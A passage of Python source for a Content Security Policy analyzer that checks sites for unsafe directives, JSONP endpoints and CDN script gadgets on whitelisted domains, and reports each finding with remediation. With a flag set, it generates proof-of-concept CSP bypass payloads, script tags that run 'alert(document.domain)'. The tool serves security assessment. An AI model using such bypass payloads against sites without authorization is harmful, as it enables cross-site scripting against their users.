                        directive=d.name,
                        weakness_type="misconfiguration",
                        severity="medium",
                        description=f"HTTP sources in {d.name} allow MITM injection",
                        detail=(
                            f"The {d.name} directive allows HTTP sources ({', '.join(http_sources)}). "
                            f"On an HTTPS page, this enables man-in-the-middle attacks to inject content."
                        ),
                        remediation=f"Use only HTTPS sources in {d.name}, or add 'upgrade-insecure-requests'.",
                    ))

        return weaknesses

    def _check_jsonp_endpoints(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check if whitelisted domains have known JSONP endpoints."""
        weaknesses = []
        script_sources = self._get_script_sources(directives)

        Logger.info("Checking whitelisted domains for JSONP endpoints...")

        for source in script_sources:
            if source.startswith("'"):
                continue

            source_clean = source.lstrip('*.')
            for known_domain, endpoints in KNOWN_JSONP_ENDPOINTS.items():
                if source_clean == known_domain or source_clean.endswith('.' + known_domain):
                    for ep in endpoints:
                        if not ep['param']:
                            continue

                        test_url = ep['url'].format(cb="alert(document.domain)//")
                        verified = False

                        try:
                            resp = self.session.get(
                                ep['url'].format(cb="testcallback123"),
                                timeout=self.timeout,
                                allow_redirects=True,
                            )
                            if resp.status_code == 200 and 'testcallback123' in resp.text:
                                verified = True
                                Logger.success(f"JSONP verified: {known_domain} ({ep['param']} param)")
                            else:
                                Logger.debug(f"JSONP not reflected at {ep['url']}")
                        except requests.RequestException:
                            Logger.debug(f"Could not reach {ep['url']}")

                        payload = f'<script src="{test_url}"></script>'

                        weaknesses.append(CSPWeakness(
                            directive="script-src",
                            weakness_type="bypass",
                            severity="high" if verified else "medium",
                            description=f"JSONP endpoint on whitelisted domain {known_domain}",
                            detail=(
                                f"The whitelisted domain '{source}' hosts a JSONP endpoint at {ep['url']}. "
                                f"The '{ep['param']}' parameter reflects the callback name, allowing script execution. "
                                f"{'VERIFIED: endpoint is active and reflects callbacks.' if verified else 'NOT VERIFIED: endpoint may be inactive.'}"
                            ),
                            bypass_payloads=[payload] if self.generate_bypass else [],
                            remediation=(
                                f"Remove '{source}' from script-src or restrict to specific paths. "
                                f"Use nonce-based CSP to prevent JSONP bypass."
                            ),
                        ))

        return weaknesses

    def _check_script_gadgets(self, directives: List[CSPDirective]) -> List[CSPWeakness]:
        """Check if whitelisted CDNs host exploitable script gadgets."""
        weaknesses = []
        script_sources = self._get_script_sources(directives)

        Logger.info("Checking whitelisted CDNs for script gadgets...")

        for source in script_sources:
            if source.startswith("'"):
                continue

            source_clean = source.lstrip('*.')
            for cdn_domain, gadgets in KNOWN_SCRIPT_GADGETS.items():
                if source_clean == cdn_domain or source_clean.endswith('.' + cdn_domain):
                    for gadget in gadgets:
                        for ver in gadget['versions'][:2]:
                            gadget_url = gadget['url_template'].format(ver=ver)
                            verified = False

                            try:
                                resp = self.session.head(gadget_url, timeout=self.timeout, allow_redirects=True)
                                if resp.status_code == 200:
                                    verified = True
                                    Logger.success(
                                        f"Script gadget found: {gadget['library']} {ver} on {cdn_domain}"
                                    )
                            except requests.RequestException:
                                pass

                            if verified:
                                bypass_payload = gadget['bypass'].format(ver=ver)
                                weaknesses.append(CSPWeakness(
                                    directive="script-src",
                                    weakness_type="bypass",
                                    severity="high",
                                    description=(
                                        f"Script gadget: {gadget['library']} {ver} on {cdn_domain}"
                                    ),
                                    detail=(
                                        f"The whitelisted CDN '{source}' hosts {gadget['library']} v{ver}, "
                                        f"which provides a {gadget['gadget_type']} gadget. "
                                        f"This library can be loaded to bypass CSP restrictions."
                                    ),
                                    bypass_payloads=[bypass_payload] if self.generate_bypass else [],
                                    remediation=(
                                        f"Use nonce-based or hash-based CSP instead of domain whitelisting. "
                                        f"If whitelisting is required, restrict to specific file paths."
                                    ),
                                ))
                                break

        return weaknesses


# ============================================================================
# REPORT GENERATOR
# ============================================================================

class CSPReportGenerator:
    """Generates structured reports from CSP analysis."""

    @staticmethod
    def generate_summary(weaknesses: List[CSPWeakness], directives: List[CSPDirective],
                         target_url: str, csp_source: str) -> Dict[str, Any]:
        """Generate a summary report."""
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        type_counts = {'misconfiguration': 0, 'bypass': 0, 'missing': 0, 'informational': 0}

        for w in weaknesses:
            severity_counts[w.severity] = severity_counts.get(w.severity, 0) + 1
            type_counts[w.weakness_type] = type_counts.get(w.weakness_type, 0) + 1

        return {
            'scan_time': datetime.now().isoformat(),
            'target_url': target_url,
            'csp_source': csp_source,
            'raw_policy': '; '.join(d.raw for d in directives),
            'total_weaknesses': len(weaknesses),
            'severity_summary': severity_counts,
            'type_summary': type_counts,
            'directives': [asdict(d) for d in directives],
            'weaknesses': [asdict(w) for w in weaknesses],
        }

    @staticmethod
    def print_text_report(weaknesses: List[CSPWeakness], directives: List[CSPDirective],
                          csp_source: str):
        """Print a human-readable text report."""
        print(f"\n  {Colors.BOLD}CSP Source: {csp_source}{Colors.END}")
        print(f"\n  {Colors.BOLD}Parsed Directives:{Colors.END}")
        for d in directives:
            print(f"    {Colors.CYAN}{d.name}{Colors.END}: {' '.join(d.sources)}")

        if not weaknesses:
            print(f"\n  {Colors.GREEN}No CSP weaknesses detected. Policy appears robust.{Colors.END}")
            return

        severity_color = {
            'critical': Colors.RED,
            'high': Colors.RED,
            'medium': Colors.YELLOW,
            'low': Colors.CYAN,
            'info': Colors.BLUE,
        }

        finding_num = 0
        for severity in ['critical', 'high', 'medium', 'low', 'info']:
            for w in weaknesses:
                if w.severity != severity:
                    continue
                finding_num += 1
                color = severity_color.get(severity, Colors.WHITE)

                print(f"\n  {Colors.BOLD}--- Weakness #{finding_num} ---{Colors.END}")
                print(f"  Severity:    {color}{w.severity.upper()}{Colors.END}")
                print(f"  Type:        {w.weakness_type}")
                print(f"  Directive:   {w.directive}")
                print(f"  Description: {w.description}")
                print(f"  Detail:      {w.detail[:200]}")
                if w.remediation:
                    print(f"  Remediation: {w.remediation[:150]}")
                if w.bypass_payloads:
                    print(f"  {Colors.YELLOW}Bypass Payloads:{Colors.END}")
                    for bp in w.bypass_payloads[:3]:
                        display = bp if len(bp) <= 200 else bp[:200] + "..."
                        print(f"    {Colors.RED}{display}{Colors.END}")


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='CSP Analyzer - Content Security Policy Security Assessment Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "https://target.com"
  %(prog)s -u "https://target.com" --bypass
  %(prog)s -u "https://target.com" --bypass --check-jsonp --check-gadgets
  %(prog)s -u "https://target.com" --bypass --output json -o csp-report.json
  %(prog)s -u "https://target.com" --check-jsonp --proxy http://127.0.0.1:8080

Weakness Types:
  misconfiguration   Unsafe directive values (unsafe-inline, data:, etc.)
  bypass             Exploitable JSONP endpoints or script gadgets on whitelisted domains
  missing            Absent directives that weaken the policy
  informational      Non-critical observations about the policy
        """
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL to fetch CSP from')
    parser.add_argument('--bypass', action='store_true',
                        help='Generate bypass payloads for each weakness found')
    parser.add_argument('--check-jsonp', action='store_true',
                        help='Check whitelisted domains for JSONP endpoints')
    parser.add_argument('--check-gadgets', action='store_true',
                        help='Check whitelisted CDNs for exploitable script gadgets')
    parser.add_argument('--output', default='text', choices=['json', 'text'],
                        help='Output format (default: text)')
    parser.add_argument('-o', '--output-file',
                        help='Output file path for report')
    parser.add_argument('--headers', default='',
                        help='Custom headers as JSON string')
    parser.add_argument('--cookies', default='',
                        help='Cookies as "name=value; name2=value2"')
    parser.add_argument('--proxy', default='',
                        help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT,
                        help=f'Request timeout in seconds (default: {DEFAULT_TIMEOUT})')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose debug output')
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')

    args = parser.parse_args()

    if args.no_color:
        Colors.disable()

    Logger.verbose = args.verbose

    # Parse optional inputs
    headers = None
    if args.headers:
        try:
            headers = json.loads(args.headers)
        except json.JSONDecodeError:
            Logger.error("Invalid JSON for --headers")
            sys.exit(1)

    cookies = {}
    if args.cookies:
        for part in args.cookies.split(';'):
            if '=' in part:
                k, v = part.strip().split('=', 1)
                cookies[k.strip()] = v.strip()

    # Banner
    print(f"""
{Colors.CYAN}{Colors.BOLD}
  ____ ____  ____     _                _
 / ___/ ___||  _ \\   / \\   _ __   __ _| |_   _ _______ _ __
| |   \\___ \\| |_) | / _ \\ | '_ \\ / _` | | | | |_  / _ \\ '__|
| |___ ___) |  __/ / ___ \\| | | | (_| | | |_| |/ /  __/ |
 \\____|____/|_|   /_/   \\_\\_| |_|\\__,_|_|\\__, /___\\___|_|
                                          |___/
    Content Security Policy Analyzer
{Colors.END}""")

    # Fetch CSP
    fetcher = CSPFetcher(
        timeout=args.timeout,
        proxy=args.proxy if args.proxy else None,
        headers=headers,
        cookies=cookies if cookies else None,
    )

    Logger.info(f"Fetching CSP from: {args.url}")
    csp_header, csp_report_only, csp_meta = fetcher.fetch(args.url)

    if csp_header is None and csp_report_only is None and csp_meta is None:
        Logger.error("Could not fetch the target URL.")
        sys.exit(1)

    # Determine which CSP to analyze
    csp_string = ''
    csp_source = ''
    all_weaknesses = []

    if csp_header:
        csp_string = csp_header
        csp_source = 'Content-Security-Policy header'
        Logger.success("Found CSP in HTTP header")
    elif csp_meta:
        csp_string = csp_meta
        csp_source = 'HTML meta tag'
        Logger.success("Found CSP in meta tag")
    elif csp_report_only:
        csp_string = csp_report_only
        csp_source = 'Content-Security-Policy-Report-Only header (NOT ENFORCED)'
        Logger.warning("CSP is in Report-Only mode - policy is NOT enforced!")
        all_weaknesses.append(CSPWeakness(
            directive="(policy)",
            weakness_type="misconfiguration",
            severity="high",
            description="CSP is in Report-Only mode - not enforced",
            detail=(
                "The Content-Security-Policy-Report-Only header is set instead of "
                "Content-Security-Policy. The policy only reports violations "
                "and does NOT block them."
            ),
            bypass_payloads=[
                "<script>alert(document.domain)</script>",
            ] if args.bypass else [],
            remediation="Change header from Content-Security-Policy-Report-Only to Content-Security-Policy.",
        ))
    else:
        csp_source = 'No CSP found'
        Logger.warning("No Content-Security-Policy header or meta tag found!")

    Logger.debug(f"CSP: {csp_string[:200]}{'...' if len(csp_string) > 200 else ''}")

    # Analyze
    analyzer = CSPAnalyzer(
        check_jsonp=args.check_jsonp,
        check_gadgets=args.check_gadgets,
        generate_bypass=args.bypass,
        timeout=args.timeout,
        proxy=args.proxy if args.proxy else None,
    )

    weaknesses, directives = analyzer.analyze(csp_string, args.url)
    all_weaknesses.extend(weaknesses)

    if csp_header and csp_report_only:
        Logger.info("Also found Report-Only CSP - analyzing for comparison...")

    # Sort by severity
    severity_order = {'critical': 5, 'high': 4, 'medium': 3, 'low': 2, 'info': 1}
    all_weaknesses.sort(key=lambda w: severity_order.get(w.severity, 0), reverse=True)

    # Print summary
    print(f"\n{Colors.BOLD}{'=' * 70}")
    print(f"  CSP ANALYSIS RESULTS")
    print(f"{'=' * 70}{Colors.END}")

    report = CSPReportGenerator.generate_summary(all_weaknesses, directives, args.url, csp_source)
    summary = report['severity_summary']

    print(f"  Total Weaknesses: {report['total_weaknesses']}")
    if summary.get('critical'):
        print(f"  {Colors.RED}Critical: {summary['critical']}{Colors.END}")
    if summary.get('high'):
        print(f"  {Colors.RED}High:     {summary['high']}{Colors.END}")
    if summary.get('medium'):
        print(f"  {Colors.YELLOW}Medium:   {summary['medium']}{Colors.END}")
    if summary.get('low'):
        print(f"  {Colors.CYAN}Low:      {summary['low']}{Colors.END}")
    if summary.get('info'):
        print(f"  {Colors.BLUE}Info:     {summary['info']}{Colors.END}")

    # Output
    if args.output == 'text':
        CSPReportGenerator.print_text_report(all_weaknesses, directives, csp_source)
    elif args.output == 'json':
        if not args.output_file:
            print(json.dumps(report, indent=2))

    print(f"\n{'=' * 70}\n")

    # Save to file
    if args.output_file:
        with open(args.output_file, 'w') as fp:
            if args.output == 'json':
                json.dump(report, fp, indent=2)
            else:
                lines = []
                lines.append("CSP Analysis Report")
                lines.append("=" * 70)
                lines.append(f"Target: {args.url}")
                lines.append(f"CSP Source: {csp_source}")
                lines.append(f"Policy: {'; '.join(d.raw for d in directives)}")
                lines.append(f"Total Weaknesses: {len(all_weaknesses)}")
                lines.append(f"Severity: {json.dumps(summary)}")
                lines.append("")
                for i, w in enumerate(all_weaknesses, 1):
                    lines.append(f"--- Weakness #{i} ---")
                    lines.append(f"Severity: {w.severity.upper()}")
                    lines.append(f"Type: {w.weakness_type}")
                    lines.append(f"Directive: {w.directive}")
                    lines.append(f"Description: {w.description}")
                    lines.append(f"Detail: {w.detail}")
                    lines.append(f"Remediation: {w.remediation}")
                    if w.bypass_payloads:
                        lines.append("Bypass Payloads:")
                        for bp in w.bypass_payloads:
                            lines.append(f"  {bp}")
                    lines.append("")
                fp.write('\n'.join(lines))
        Logger.success(f"Report saved to: {args.output_file}")

    # Exit code: 1 if critical or high weaknesses found
    sys.exit(1 if any(w.severity in ('critical', 'high') for w in all_weaknesses) else 0)


if __name__ == '__main__':
    main()
